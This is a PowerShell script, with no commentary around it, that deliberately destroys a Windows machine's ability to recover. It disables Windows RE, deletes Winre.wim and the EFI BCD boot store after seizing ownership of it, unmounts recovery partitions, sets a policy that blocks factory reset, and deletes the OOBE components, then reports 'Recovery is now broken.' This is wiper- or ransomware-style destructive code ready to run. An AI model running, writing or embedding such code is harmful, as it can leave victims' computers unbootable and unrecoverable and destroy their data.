function Report($msg, $type = "info") {
    switch ($type) {
        "info" { Write-Host "[~] $msg" -ForegroundColor Yellow }
        "ok"   { Write-Host "[+] $msg" -ForegroundColor Green }
        "fail" { Write-Host "[!] $msg" -ForegroundColor Red }
    }
}

Report "Disabling Windows Recovery Environment..."
if ((reagentc /disable) -match "Operation successful") {
    Report "Windows RE disabled." "ok"
} else {
    Report "Failed to disable Windows RE." "fail"
}

Start-Sleep -Seconds 2

$winrePath = "C:\Windows\System32\Recovery\Winre.wim"
if (Test-Path $winrePath) {
    try {
        Remove-Item -Path $winrePath -Force -ErrorAction Stop
        Report "Winre.wim deleted." "ok"
    } catch {
        Report "Failed to delete Winre.wim." "fail"
    }
} else {
    Report "Winre.wim not found. Already gone?" "info"
}

$bcdStore = "$env:SystemDrive\EFI\Microsoft\Boot\BCD"
if (Test-Path $bcdStore) {
    try {
        takeown /f $bcdStore | Out-Null
        icacls $bcdStore /grant administrators:F | Out-Null
        Remove-Item $bcdStore -Force -ErrorAction Stop
        Report "BCD store deleted." "ok"
    } catch {
        Report "Failed to delete BCD store." "fail"
    }
} else {
    Report "BCD store not found." "info"
}

$recoveryPartitions = Get-WmiObject Win32_DiskPartition | Where-Object { $_.Type -like "*Recovery*" }
if ($recoveryPartitions.Count -gt 0) {
    foreach ($part in $recoveryPartitions) {
        $assoc = "ASSOCIATORS OF {Win32_DiskPartition.DeviceID='$($part.DeviceID)'} WHERE AssocClass=Win32_LogicalDiskToPartition"
        $disks = Get-WmiObject -Query $assoc
        foreach ($disk in $disks) {
            try {
                mountvol $disk.DeviceID /d | Out-Null
                Report "Unmounted Recovery Volume $($disk.DeviceID)." "ok"
            } catch {
                Report "Failed to unmount Recovery Volume $($disk.DeviceID)." "fail"
            }
        }
    }
} else {
    Report "No Recovery Partitions found." "info"
}

try {
    New-Item -Path "HKLM:\SOFTWARE\Policies\Microsoft\Windows\Recovery" -Force | Out-Null
    Set-ItemProperty -Path "HKLM:\SOFTWARE\Policies\Microsoft\Windows\Recovery" -Name "DisableResetToFactoryDefaults" -Value 1 -Type DWord
    Report "Registry policy set: Reset to Factory Defaults disabled." "ok"
} catch {
    Report "Failed to set Reset disable policy." "fail"
}

$oobePaths = Get-ChildItem -Path "C:\Windows\SystemApps" -Filter "Microsoft.Windows.OOBE*" -ErrorAction SilentlyContinue
if ($oobePaths.Count -gt 0) {
    try {
        $oobePaths | Remove-Item -Recurse -Force -ErrorAction Stop
        Report "OOBE components deleted." "ok"
    } catch {
        Report "Failed to delete OOBE components." "fail"
    }
} else {
    Report "OOBE components not found." "info"
}

Report "Operation Complete. Recovery is now broken." "ok"
